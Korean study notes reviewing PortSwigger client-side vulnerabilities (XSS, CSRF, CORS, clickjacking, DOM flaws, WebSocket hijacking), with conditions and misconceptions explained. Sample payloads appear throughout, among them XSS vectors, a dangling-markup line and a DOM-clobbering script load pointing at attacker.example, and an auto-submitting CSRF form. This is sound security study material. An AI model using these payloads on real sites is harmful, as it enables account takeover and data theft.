# 클라이언트 측 취약점 복습

## 01 XSS

원본: [[보안/웹해킹/PortSwigger/Client-side/01-XSS]]

### 발생 원리와 조건

공격자가 제어한 데이터가 HTML·JavaScript·URL·템플릿 등의 문맥에서 안전하지 않게 해석되어 **피해자 브라우저의 대상 출처에서 코드가 실행**된다. 입력이 보인다는 사실과 실행된다는 사실을 구별해야 한다.

| 분류 | 입력이 전달되는 경로 | 대표 예 |
|---|---|---|
| 반사형 | 요청 값이 즉시 응답에 포함 | 검색어가 HTML에 삽입 |
| 저장형 | 입력이 저장된 후 다른 요청의 출력에 포함 | 댓글·닉네임·관리자 로그 |
| DOM 기반 | 브라우저 JS가 소스 값을 위험한 싱크로 전달 | URL 값 → innerHTML |

반사형/저장형은 전달·저장 방식, DOM 기반은 위험 처리가 일어나는 방식이다. 서버에서 반사·저장된 데이터가 브라우저의 위험한 싱크로 들어가는 **반사형 DOM XSS, 저장형 DOM XSS**도 가능하다.

### 공통 공격 흐름

1. 검색·댓글·프로필·헤더 등에 고유 표식(`test_name_01`)을 넣는다.
2. **출력 지점**을 찾는다. 저장형은 입력 페이지와 출력 페이지가 다르거나 관리자에게만 보일 수 있다.
3. **문맥**을 식별한다. HTML 텍스트, 속성, JS 문자열, 템플릿, URL 중 무엇인가?
4. **변환 과정**을 확인한다. 따옴표·역슬래시·꺾쇠가 제거/이스케이프/인코딩되는가?
5. 문맥에 맞는 최소 예시로 실행을 관찰한다. 이벤트가 필요하면 클릭·포커스 등도 재현한다.
6. CSP·HttpOnly·브라우저 동작을 고려해 실제 영향을 구별한다.

### 도구별로 무엇을 볼까

| 도구 | 보는 것 | 목적 |
|---|---|---|
| Burp 응답 / 페이지 소스 | 서버에서 보낸 HTML | 서버 측 반사 위치·원래 따옴표·필터 결과 |
| 개발자 도구 Elements | 파싱과 JS 실행 이후 DOM | 이벤트 속성·생성된 요소·최종 DOM |
| 개발자 도구 Sources·중단점 | 실행되는 JS와 변수 | Source→변환→Sink 흐름 추적 |
| DOM Invader | 입력 표식과 싱크·웹 메시지 추적 | 수동 분석을 돕는 단서 |

Elements가 속성 따옴표 등을 정규화해 보여줄 수 있으므로 서버가 실제로 보낸 구분자는 응답 원문에서 본다. DOM 기반 문제는 응답에 입력값이 없어도 브라우저 실행 후 나타날 수 있다.

### 문맥별 공격 방법과 대표 예시

#### HTML 태그 사이

```html
<!-- 취약한 출력 위치 -->
<p>사용자 입력</p>
<!-- 해당 HTML 문맥의 실행 확인 예 -->
<img src=x onerror=alert(1)>
```

HTML로 해석되는 위치라면 새 태그·이벤트를 만들 수 있다. 태그가 필터링되면 무작정 같은 구문을 반복하기보다 어떤 태그·이벤트·문자가 남는지 확인한다.

원본에는 body 이벤트, 포커스 가능한 커스텀 태그, SVG의 animate/onbegin 등도 있다. 각각 **태그가 실제 생성되는지, 이벤트가 발생하는지, 브라우저가 지원하는지**가 전제다. 예를 들어 animationstart는 대응 애니메이션이 실행되어야 한다.

#### HTML 속성 값

```html
<input value="사용자 입력">
```

- 큰따옴표가 허용되면 `"><img src=x onerror=alert(1)>`로 속성과 태그를 닫는 방법을 검토한다.
- `<`, `>`가 막혀도 따옴표가 살아 있으면 `" autofocus onfocus=alert(1) x="`처럼 새 이벤트 속성을 넣을 수 있다.
- `href`를 직접 제어하면 클릭 시 `javascript:alert(1)`이 실행되는지 확인한다. URL 속성마다 허용 스킴과 실행 동작은 다르다.
- 원본의 canonical link + accesskey는 브라우저와 사용자의 단축키 입력이 필요한 특수 예시이다.

**속성에 들어간 데이터가 모두 HTML 문법으로 다시 해석되는 것은 아니다.** DOM의 `.href = value`로 URL만 지정하는 것과 HTML 문자열에 `href="` + value를 조립하는 것은 다른 경계다.

#### JavaScript 문자열

```html
<script>var searchTerms = '사용자 입력';</script>
```

| 방법 | 예시 | 원리 |
|---|---|---|
| 문자열 종료 | `';alert(1)//` | 따옴표를 닫고 코드 추가, 뒤를 주석 |
| 표현식 연결 | `'-alert(1)-'` | 문자열과 함수 호출을 하나의 표현식으로 구성 |
| 불완전한 이스케이프 우회 | `\';alert(1)//` | 서버가 따옴표만 이스케이프하면 역슬래시의 역할이 바뀔 수 있음 |
| HTML 파서 경계 종료 | `</script><img src=x onerror=alert(1)>` | JS 문자열 안이어도 HTML 파서가 script 끝으로 인식할 수 있음 |

마지막 예시는 **HTML 파싱이 JavaScript 해석보다 먼저**라는 점을 이용한다. 기존 JS가 문법 오류로 실행되지 않아도 뒤에 만들어진 HTML 이벤트가 실행될 수 있다.

괄호가 막힌 환경에서 원본의 `onerror=alert;throw 1`은 명시적 함수 호출 대신 전역 오류 핸들러 호출을 유도하는 기법이다. 이는 **이미 JS 문맥을 제어하는 경우**의 예이며 브라우저의 오류 전달 형식에 따라 표시값이 달라질 수 있다.

#### 이벤트 속성과 HTML 엔티티

```html
<a onclick="var input='&apos;-alert(1)-&apos;';">click</a>
```

속성은 HTML 엔티티 디코딩 후 JS로 해석되므로 코드 경계가 바뀔 수 있다. 반대로 `<p>&lt;script&gt;</p>`의 디코딩 결과는 텍스트이며 자동으로 새 script 태그로 재파싱되지 않는다. `<script>` 본문도 이벤트 속성과 동일하게 HTML 엔티티 디코딩된다고 가정하면 안 된다.

#### 템플릿 리터럴

서버가 사용자 입력을 **생성할 JavaScript 코드의 백틱 내부에 직접 삽입**하면 `${alert(1)}` 같은 표현식 주입이 가능할 수 있다.

반면 `element.innerText = \`Welcome, ${user.displayName}\`;`처럼 이미 만들어진 프로그램에서 displayName이 문자열인 경우, 그 값 안의 `${...}`가 자동으로 재평가되지는 않는다. **코드 생성과 런타임 데이터 대입을 구별한다.**

### DOM XSS: 소스에서 싱크까지

```js
const q = new URLSearchParams(location.search).get('query');
document.getElementById('results').innerHTML = q;
```

`query=<img src=x onerror=alert(1)>`를 브라우저가 받아 URLSearchParams로 디코딩하고 innerHTML에서 HTML로 파싱하면 이벤트가 실행될 수 있다.

| 소스 후보 | 싱크 후보 | 주의점 |
|---|---|---|
| location.search / hash | document.write / innerHTML | 소스마다 디코딩이 다름 |
| postMessage의 event.data | eval / 문자열 setTimeout | 메시지 출처와 데이터 구조 확인 |
| 서버에서 받은 JSON | eval | JSON은 JSON.parse로 파싱하는 것과 다름 |
| 쿠키·저장소·window.name | href / location 등 | 공격자가 해당 값을 실제로 제어 가능한지 |

- `document.write('<img src="…'+q+'">')`라면 먼저 속성 경계를 벗어나야 한다.
- `select/option` 안에 삽입되면 `</select>`처럼 파서 문맥을 끝내야 다른 태그가 만들어질 수 있다.
- `innerHTML`로 삽입한 script 태그는 일반적으로 실행되지 않지만 이벤트 핸들러 등 다른 실행 경로가 남을 수 있다. “script가 안 됨 = 안전”은 아니다.
- `setTimeout(callbackFunction, …)`과 `setTimeout('코드 문자열', …)`은 구별한다. 문자열 실행 경로가 문제다.
- 데이터가 서버에서 만들어졌다고 XSS가 불가능해지는 것은 아니다. 서버 측 반사형/저장형 XSS도 있다.

### 라이브러리와 클라이언트 템플릿 삽입

- **jQuery attr:** `attr('href', returnUrl)`은 URL 스킴 검증이 없으면 위험한 링크를 만들 수 있다.
- **jQuery `$()` 선택자:** 구버전에서 공격자 문자열이 HTML 요소 생성으로 해석되는 경로를 확인한다. hashchange 이벤트를 사용하는 예시는 초기 로드 외에 실제 hash 변경을 유도해야 한다.
- **AngularJS/CSTI:** 공격자 입력이 `{{7*7}}` 같은 **템플릿 원문으로 컴파일**되면 표현식이 평가될 수 있다. 일반 데이터 바인딩은 별개다.
- 원본의 constructor, charAt 변경, orderBy, 이벤트 경로를 통한 AngularJS 샌드박스/CSP 우회는 **해당 버전·식 평가 환경에 종속**된다. 모든 AngularJS에 통하는 공식으로 외우지 않는다.
- JavaScript `replace('x','')`의 단일 치환, 부정확한 includes/indexOf 검사는 우회 단서일 수 있다. 무슨 문맥에서 결과를 쓰는지까지 추적한다.

### 실행 후 가능한 영향

쿠키 읽기, 같은 출처의 요청·응답 접근, DOM의 CSRF 토큰 읽기, 사용자 권한으로 상태 변경 등이 가능할 수 있다. 원본에는 쿠키를 댓글로 게시하기, 자동완성 입력을 읽기, 이메일 변경 폼 악용 등이 정리되어 있다.

- `HttpOnly` 쿠키는 document.cookie로 읽을 수 없다. 그래도 XSS가 같은 출처의 인증 요청을 보내는 위험까지 없어지는 것은 아니다.
- 비밀번호 자동완성·onchange 발생은 브라우저와 비밀번호 관리자에 따라 다르다.
- FormData를 fetch body로 보낼 때 multipart boundary는 브라우저가 맞추도록 한다. 원본처럼 Content-Type을 임의로 고정하면 본문과 불일치할 수 있다.
- DOM 요소 생성 시점 전에 접근하면 실패할 수 있다. DOMContentLoaded나 실제 실행 순서를 확인한다.

### 스크립트 없이도 가능한 마크업 공격

**댕글링 마크업:** 닫히지 않은 속성이 뒤쪽의 민감한 HTML을 URL 값으로 흡수하도록 유도하는 방식이다.

```html
"><img src='//attacker.example/?
```

이후 문서의 따옴표·브라우저 파싱·외부 요청 제한에 따라 유출 범위가 달라진다. 문서 끝까지 반드시 전송된다고 단정하지 않는다.

**폼 하이재킹:** 주입한 버튼에 `formaction`과 `formmethod`를 지정해 기존 폼의 필드가 공격자 URL로 제출되도록 유도할 수 있다. 사용자 클릭, 폼 구조, CSP의 form-action 등 조건을 확인한다. 순수 HTML 주입으로도 가능하므로 모든 사례를 스크립트 실행 XSS로 뭉뚱그리지 않는다.

### CSP와 확인 필요

CSP는 리소스 로딩·스크립트 실행 등을 제한하는 브라우저 정책이다. `script-src`의 허용 출처·nonce·hash, 인라인/문자열 실행 정책을 살핀다. `frame-ancestors`는 누가 이 페이지를 프레임에 넣을 수 있는지 제어한다.

원본의 `report-uri`에 사용자 입력을 연결하는 예시는 `;script-src-elem 'unsafe-inline'` 같은 **정책 자체 주입**이 가능한 잘못된 헤더 생성 상황이다. 기존 지시어·다른 CSP 정책·실제 실행 경로가 허용하는지 확인해야 한다. 사용자 클릭이나 DOM 클로버링만으로 CSP가 항상 우회되지는 않는다.

## 02 CSRF

원본: [[보안/웹해킹/PortSwigger/Client-side/02-CSRF]]

### 발생 원리와 조건

공격자 페이지가 피해자의 브라우저로 대상 사이트에 요청을 보내게 하고, 대상이 **자동으로 동반된 인증 정보만 믿고 피해자가 의도한 요청으로 처리**하는 문제이다.

보통 다음이 함께 필요하다.

- 의미 있는 상태 변경 요청이 있다.
- 브라우저가 세션 쿠키 등의 인증 정보를 공격 요청에 동반할 수 있다.
- 공격자가 필요한 요청 값을 만들 수 있고, 예측 불가능한 토큰·재인증 등 검증을 통과하거나 우회할 수 있다.

### 공격 흐름과 대표 예시

```html
<form action="https://target.example/email/change" method="POST">
  <input type="hidden" name="email" value="test@attacker.example">
</form>
<script>document.forms[0].submit();</script>
```

피해자가 공격자 페이지 방문 → 폼 제출 → 쿠키 전송 조건을 만족하면 인증 정보 동반 → 서버가 검증 없이 이메일 변경. 공격자가 응답을 읽지 못하더라도 상태 변경은 일어날 수 있다.

### 공격 방법: 토큰 검증 차이

| 검증 결함 | 비교할 방법 | 추가 조건 |
|---|---|---|
| 토큰 누락 시 검사 생략 | 값 비우기와 키 전체 삭제 비교 | 토큰 없이 상태 변경됨 |
| POST에서만 검사 | 같은 기능의 GET 요청 | 서버가 GET도 실제 처리 |
| 세션에 결합 안 됨 | 내 토큰을 다른 세션 요청에 사용 | 전역 유효 토큰으로만 검사 |
| 별도 CSRF 쿠키에만 결합 | 내 csrfKey와 토큰 쌍 사용 | 피해자 브라우저에 그 쿠키를 설정할 수 있음 |
| 단순 double-submit | 쿠키와 본문을 같은 임의값으로 설정 | 쿠키 주입 가능, 다른 무결성 검증 없음 |

원본은 CRLF 응답 헤더 주입으로 Set-Cookie를 추가하는 공격 체인을 제시한다. 이는 **CSRF만으로 쿠키를 임의 설정하는 것**이 아니라 별도 응답 헤더 주입 취약점이 필요한 경우이다.

### SameSite를 함께 판단하기

| 값 | 일반적인 cross-site 최상위 GET | 일반적인 cross-site POST/iframe/fetch |
|---|---|---|
| Strict | 쿠키 제한 | 쿠키 제한 |
| Lax | 쿠키 허용 가능 | 쿠키 제한 |
| None; Secure | 쿠키 허용 가능 | 쿠키 허용 가능 |

표는 개념 비교이며 실제 전송은 브라우저 정책·쿠키 범위·credentials 등도 충족해야 한다. 속성 생략과 명시적 Lax가 모든 브라우저에서 완전히 같다고 단정하지 않는다.

**원본에 정리된 우회 경로**

1. Lax에서 최상위 GET으로 상태 변경이 가능한지 확인한다.
2. GET의 `_method=POST`를 서버가 메서드 오버라이드로 수용하는지 확인한다.
3. 대상 사이트의 클라이언트 리다이렉트가 후속 same-site 요청을 만드는지 본다.
4. 같은 사이트의 다른 서브도메인에 실행 가능한 페이지/XSS가 있는지 확인한다.

모두 추가 구현 조건이 필요하다. 리다이렉트가 있다고 무조건 SameSite를 우회하는 것은 아니다.

### Referer 검증 공격

- 헤더가 없을 때 검증을 생략하면 referrer policy로 누락시키는 경로를 확인한다.
- 문자열 접두사 검사라면 `target.example.attacker.example`을 잘못 허용하는지 본다.
- 포함 여부 검사라면 공격자 URL의 경로/쿼리에 대상 이름을 넣어도 통과하는지 본다.
- 브라우저가 실제 보내는 Referer는 정책에 따라 경로·쿼리가 빠질 수 있다. Burp에서 임의 헤더를 넣은 결과만으로 피해자 브라우저에서의 재현을 확정하지 않는다.

### 헷갈리기 쉬운 개념과 확인 필요

- CORS가 응답 읽기를 막아도 단순 폼 요청의 상태 변경을 막아 주는 것은 아니다.
- form.submit은 페이지 이동이지만 쿠키 전송이 무조건 보장되지는 않는다. SameSite·제3자 쿠키 제한도 적용된다.
- XSS는 같은 출처에서 토큰을 읽어 CSRF 방어를 무력화할 수 있다. CSRF 토큰은 XSS의 일반적인 방어가 아니다.
- 쿠키 기반 인증이 대표 사례지만 핵심은 **브라우저가 자동 동반하는 인증**이다. 공격자가 모르는 Bearer 토큰을 요청에 직접 넣어야 한다면 같은 공격 흐름은 성립하기 어렵다.

## 03 CORS

원본: [[보안/웹해킹/PortSwigger/Client-side/03-CORS]]

### 발생 원리와 조건

CORS는 교차 출처 응답을 JS가 읽도록 허용하는 메커니즘이다. 허용하지 않아야 할 출처를 신뢰하면 공격자 페이지가 피해자 권한으로 받은 민감 응답을 읽을 수 있다.

SOP는 전송과 읽기를 구별한다. 다른 출처의 이미지를 표시하거나 폼을 제출하는 것과 fetch로 응답 내용을 읽는 것은 다르다. CORS 허용만으로 다른 출처 iframe의 DOM이나 저장소에 접근할 수 있는 것도 아니다.

### 공격 흐름과 대표 예시

1. 민감 API에 다른 Origin을 넣어 허용 응답을 비교한다.
2. 임의 Origin 반사·잘못된 정규식·null 허용·취약한 신뢰 출처를 찾는다.
3. 피해자 브라우저에서 실제 요청을 보내 쿠키 동반 여부와 응답 읽기 여부를 확인한다.

```http
Origin: https://attacker.example

Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true
```

위 응답을 내는 대상에 공격자 출처에서 다음을 실행하는 흐름이다.

```js
fetch('https://target.example/accountDetails', {credentials: 'include'})
  .then(r => r.text())
  .then(data => console.log(data));
```

민감 응답을 읽는 단계까지 성공해야 한다. credentials는 인증을 만들거나 SameSite 정책을 무시하는 옵션이 아니다.

### 단순 요청과 사전 요청

| 유형 | 예 | 브라우저 동작 |
|---|---|---|
| 단순 요청 | 허용 메서드·헤더 조건의 GET/HEAD/POST | 실제 요청 후 응답 읽기 검사 |
| non-simple | PUT/PATCH, JSON Content-Type, 커스텀 헤더 등 | OPTIONS 사전 요청 허용 후 실제 요청 |

메서드가 GET/POST라고 항상 단순 요청은 아니다. Content-Type과 헤더 조건도 본다. `Access-Control-Allow-Methods`, `Allow-Headers`는 사전 요청의 허용 범위를 전달한다. 쿠키를 자동 동반하는 방식의 응답 읽기에는 정확한 허용 출처와 credentials 조건을 확인한다. `Access-Control-Allow-Origin: *`와 credentials 허용을 조합했다고 쿠키 기반 민감 응답을 읽을 수 있는 것은 아니다.

### 공격 방법

- **Origin 반사:** 임의 요청 Origin을 ACAO에 그대로 복사하는지 확인한다.
- **호스트 검사 오류:** `normal.example.attacker.example`, `attackernormal.example` 등을 정상 출처로 잘못 허용하는지 본다.
- **null Origin:** allow-same-origin 없는 sandbox iframe 등 불투명 출처에서 null을 만드는 경로와 서버의 null 허용을 결합한다.
- **신뢰 출처의 XSS:** 허용된 서브도메인에서 실행되는 코드로 API를 읽는다.
- **HTTP 신뢰 출처:** 네트워크 공격자가 조작할 수 있는 HTTP 출처를 HTTPS 대상이 신뢰하는 경우를 조사한다.
- **내부망 읽기:** 공격자가 직접 닿지 못하는 내부 서비스를 피해자 브라우저가 읽을 수 있는지 조사한다. 네트워크 접근과 브라우저 보안 정책을 별도로 충족해야 한다.

### 헷갈리기 쉬운 개념과 확인 필요

ACAC는 쿠키를 자동으로 붙여 주는 헤더가 아니다. ACAC 부재가 이미 전송된 모든 요청의 쿠키를 제거한다는 뜻도 아니다. null은 특정 한 사이트를 뜻하지 않으며 모든 blob URL의 출처가 null인 것도 아니다. 원본의 내부망 접근·HTTP 신뢰 출처 예시는 SameSite와 브라우저의 추가 보안 제약을 고려해야 한다.

## 04 클릭재킹

원본: [[보안/웹해킹/PortSwigger/Client-side/04-클릭재킹]]

### 발생 원리와 조건

공격자가 실제 대상 페이지를 iframe으로 겹쳐 놓고 피해자가 미끼를 누른다고 생각하면서 **대상 페이지의 진짜 버튼을 클릭**하게 한다. 프레이밍이 가능하고, 필요한 인증 상태·UI·클릭 위치가 유지되어야 한다.

### 공격 흐름과 대표 예시

1. 대상 페이지가 외부 iframe에서 열리는지 확인한다.
2. 버튼 위치를 정하고 미끼 UI와 겹친다.
3. 테스트 때는 프레임을 보이게 두고 위치를 맞춘다.
4. 투명도를 낮춘 뒤 클릭이 실제 상태 변경으로 이어지는지 확인한다.

```html
<div style="position:absolute;top:520px;left:60px">Click me</div>
<iframe src="https://target.example/my-account"
  style="position:relative;width:1000px;height:700px;opacity:0.1;z-index:2">
</iframe>
```

z-index, 위치, 화면 크기, 스크롤·확대 비율에 따라 성공 여부가 달라진다. Burp Clickbandit은 이러한 클릭 경로와 배치를 만드는 데 활용하는 원본의 도구다.

### 공격 방법과 연결

- 쿼리 파라미터로 이메일 등 폼 값이 미리 채워지는 경우 클릭 한 번으로 제출되도록 구성할 수 있다.
- 여러 버튼을 순서대로 누르게 만드는 다단계 흐름도 생각할 수 있다.
- 폼 값이 innerHTML로 들어가는 별도 DOM XSS가 있으면 클릭재킹으로 제출을 유도할 수 있다.
- JS 프레임 버스터를 쓰는 경우 iframe sandbox 제약으로 최상위 이동을 막을 수 있는지 조사한다. 필요한 폼·스크립트 동작도 같이 유지되어야 한다.

### 헷갈리기 쉬운 개념과 확인 필요

정상 페이지의 정상 폼을 클릭하므로 유효 CSRF 토큰도 같이 제출될 수 있다. CSRF 토큰만으로 클릭재킹을 막기 어렵다. iframe 표시 제한은 `X-Frame-Options: DENY/SAMEORIGIN`, CSP `frame-ancestors`와 연결해 복습한다.

원본의 “투명도가 특정 값보다 낮으면 브라우저가 클릭 차단”, “sandbox로 모든 프레임 버스터가 무력화”는 보편 규칙으로 취급하지 않는다. `ALLOW-FROM`도 범용 방어값으로 외우지 않는다. iframe 내 로그인 상태는 SameSite·브라우저 쿠키 정책에 따라 달라진다.

## 05 DOM 기반 취약점

원본: [[보안/웹해킹/PortSwigger/Client-side/05-DOM-기반-취약점]]

### 발생 원리와 공통 공격 흐름

브라우저 JS에서 공격자 데이터가 위험한 용도로 사용되는 **Source→변환→Sink** 흐름의 문제이다. 결과는 XSS뿐 아니라 외부 이동·잘못된 전송·저장 데이터 오염 등이 될 수 있다.

1. location, referrer, cookie, window.name, 저장소, postMessage 중 실제 제어 가능한 소스를 찾는다.
2. 중단점으로 데이터가 어떻게 디코딩·파싱·조립되는지 추적한다.
3. 최종 싱크에서 코드·URL·저장값·쿼리 중 무엇으로 소비되는지 확인한다.
4. 입력을 바꿔 실제 영향이 발생하는지 관찰한다.

싱크 이름만 발견해도 취약점인 것은 아니다. `JSON.parse()`는 JSON을 파싱하고, `setAttribute()`는 지정 속성을 바꾸며, 저장소 쓰기는 데이터를 보관한다. **그 결과가 어떤 위험한 동작에 쓰이는지**가 핵심이다.

### 웹 메시지 postMessage

```js
targetWindow.postMessage(message, targetOrigin);
```

- targetOrigin: **보내는 쪽**이 수신할 창의 출처를 제한한다.
- event.origin: **받는 쪽**에서 브라우저가 알려 주는 발신 출처이다.
- event.source: 어느 창에서 왔는지 확인할 때 함께 검토할 수 있다.
- event.data: 받은 데이터. 출처·형식·용도에 맞는 검증이 필요하다.

원본의 위험한 흐름은 수신 출처를 검사하지 않거나 부정확한 includes 검사만 한 뒤 데이터를 HTML 또는 URL 싱크에 넣는 것이다.

```js
// 취약한 검증 예
if (e.data.includes('http:')) location.href = e.data;
```

`javascript:print()//http:`처럼 실제 스킴과 포함 문자열이 다른 입력은 이 검사의 결함을 보여 준다. 공격 페이지가 대상 iframe/popup을 열고 메시지를 보내려면 로드 시점과 대상 리스너의 준비 시점도 맞아야 한다. `JSON.parse`로 읽은 메시지라도 url 필드가 위험한 싱크로 전달되면 문제가 남는다.

### 유형별 공격 방법과 대표 예시

| 유형 | 원본의 대표 흐름 | 확인할 영향과 조건 |
|---|---|---|
| DOM XSS | URL→innerHTML/document.write | HTML/JS 실행. [[#01 XSS]] 참조 |
| 오픈 리다이렉트 | hash→location | 공격자 외부 URL로 이동. HTTPS만 검사해도 대상 제한은 안 됨 |
| 쿠키 조작 | URL→document.cookie→다른 페이지 출력 | 쓰기만으로 끝나는지, 이후 위험한 출력/인증 처리로 이어지는지 |
| JS 삽입 | hash→eval, query→문자열 setTimeout | 제어 가능한 문자열이 실제 코드로 실행되는지 |
| document.domain 조작 | 입력→document.domain | 적용 가능한 레거시 환경과 출처 완화 조건 |
| 웹소켓 URL 조작 | hash→new WebSocket(url) | 공격자 서버로 연결해 민감 메시지를 보내는지 |
| 링크·폼 조작 | 입력→href/action/src | 클릭·폼 제출·리소스 로드 대상을 바꿈 |
| Ajax 헤더 조작 | 입력→요청 헤더 값 | 허용되는 헤더인지, 대상 서버가 값을 어떻게 신뢰하는지 |
| 클라이언트 SQLi | 입력→로컬 SQL 문자열 | 해당 SQL 엔진과 접근 가능한 데이터가 있어야 함 |
| 저장소 조작 | 입력→localStorage/sessionStorage | 나중에 꺼내 실행·전송·권한 결정에 쓰이는지 |
| XPath 주입 | 입력→document.evaluate 표현식 | XML/DOM 조회 조건이 바뀌는지 |

**확인 필요:** 로컬 파일 경로 조작은 원본의 FileReader 예시로는 입증되지 않는다. FileReader.readAsText는 일반 웹페이지에서 경로 문자열로 임의 로컬 파일을 읽는 API가 아니다. 파일 접근 권한이 있는 다른 환경이나 API를 구분해야 한다. Ajax 헤더·클라이언트 SQL·XPath 등은 원본에 완성된 공격 체인 설명이 부족하므로 표의 가능성을 실제 취약점으로 단정하지 않는다.

### DOM 클로버링

HTML의 id/name이 JS의 이름 기반 요소 접근과 충돌해, 애플리케이션이 일반 설정 객체라고 생각한 값을 DOM 요소로 바꾸는 기법이다. 스크립트 태그가 없어도 HTML 삽입과 취약한 JS gadget이 결합될 수 있다.

```js
const config = window.someObject || {};
const script = document.createElement('script');
script.src = config.url;
document.body.appendChild(script);
```

```html
<a id=someObject></a>
<a id=someObject name=url href=https://attacker.example/demo.js></a>
```

원본의 동작 흐름: 중복 id가 컬렉션으로 노출 → name=url인 요소 접근 → a 요소의 문자열 변환이 href를 반환 → script.src에 공격자 URL이 들어감. **실제 브라우저의 named access와 코드의 속성 접근이 맞아야 한다.** CSP가 그 외부 스크립트를 허용하는지도 별도 조건이다.

form의 자식에 `id=attributes`를 넣어 수제 필터가 예상한 `form.attributes`를 가리는 예시도 있다. 원본의 필터 코드와 DOM 속성 해석이 일치할 때만 성립하며, 모든 sanitizer를 우회한다고 일반화하지 않는다.

### 헷갈리기 쉬운 개념과 확인 필요

- DOM API로 노드를 만드는 것과 HTML 문자열을 파싱하는 것은 다르다. createElement만으로 임의 문자열이 HTML로 파싱되는 것은 아니다.
- `.href`의 URL 정규화와 `getAttribute('href')`의 원시 속성값을 구별한다.
- `src=javascript:…`가 모든 태그에서 실행된다는 규칙은 없다.
- 저장소는 origin별로 분리된다. 다른 사이트가 임의로 대상 localStorage에 직접 쓸 수 있다고 가정하지 않는다.
- 원본의 document.domain, Web SQL·로컬 DB 등 레거시/특수 환경 설명은 현재 사용 환경 확인이 필요하다.

## 06 웹소켓 취약점

원본: [[보안/웹해킹/PortSwigger/Client-side/06-웹소켓-취약점]]

### 발생 원리와 조건

웹소켓은 연결 후 양방향으로 메시지를 교환한다. 인증·인가·입력 검증·출력 처리가 빠지면 HTTP와 비슷하게 주입, XSS, 권한 문제 등이 발생할 수 있다. 통신 방식이 바뀌었다고 메시지가 신뢰 가능한 데이터가 되지는 않는다.

### 연결과 메시지 구별

원본의 HTTP/1.1 예시는 GET 핸드셰이크에 Upgrade, Sec-WebSocket-Key 등이 포함되고 서버가 `101 Switching Protocols`로 전환한다. 이후 `ws.send(...)`로 별도 메시지를 전송한다.

**Sec-WebSocket-Key는 사용자 인증 토큰이 아니다.** 프로토콜의 핸드셰이크 값만 있다고 CSRF 방어가 되는 것은 아니다.

### 공격 흐름과 방법

1. Burp WebSockets history에서 정상 연결과 메시지 구조를 확인한다.
2. Intercept/Repeater로 메시지의 사용자 ID·명령·본문을 변경한다.
3. 서버의 입력 검증과 다른 사용자에게 전달될 때의 출력 처리를 구별한다.
4. 핸드셰이크의 쿠키·Origin·프록시 IP 헤더에 대한 검증도 확인한다.
5. 연결 후 개별 메시지마다 필요한 권한을 확인하는지 조사한다.

대표 예시는 채팅 메시지에 HTML을 넣었을 때 다른 사용자의 화면이 이를 HTML로 해석해 XSS로 이어지는 경우이다. 실제 싱크가 textContent라면 같은 문자열만으로 실행되지는 않는다.

### CSWSH: 교차 사이트 웹소켓 하이재킹

공격자 페이지가 피해자 브라우저로 대상 웹소켓에 연결하고, 자동 동반된 인증 정보를 이용해 메시지를 주고받는 공격이다.

```js
const ws = new WebSocket('wss://target.example/chat');
ws.onopen = () => ws.send('READY');
ws.onmessage = event => console.log(event.data);
```

원본의 랩은 READY 메시지를 보내면 과거 채팅 기록을 반환한다. 다른 사이트에 보편적으로 존재하는 명령은 아니다.

성립에는 쿠키 등 인증 정보가 실제로 전송되고, 서버가 공격자 Origin을 거부하지 않으며, 예측 불가능한 추가 인증/연결 토큰을 요구하지 않는 등의 조건이 필요하다. 일반 CSRF와 달리 **성공한 공격자 연결에서 응답 메시지도 받을 수 있다**는 점이 중요하다.

### 헷갈리기 쉬운 개념과 확인 필요

- 일반 fetch의 CORS 허용 헤더를 웹소켓 방어와 동일하게 보지 않는다. 서버의 핸드셰이크 Origin 검증을 확인한다.
- Burp로 Origin을 바꾸는 검사와 공격자 웹페이지에서 브라우저가 만드는 실제 Origin은 다르다.
- cross-origin 연결 가능성과 인증 쿠키 전송 가능성은 별개이다. SameSite·제3자 쿠키 정책을 확인한다.
- DOM 웹소켓 URL 조작은 대상 페이지가 공격자 서버에 연결하는 흐름이고, CSWSH는 공격자 페이지가 대상 서버에 피해자 권한으로 연결하는 흐름이다.
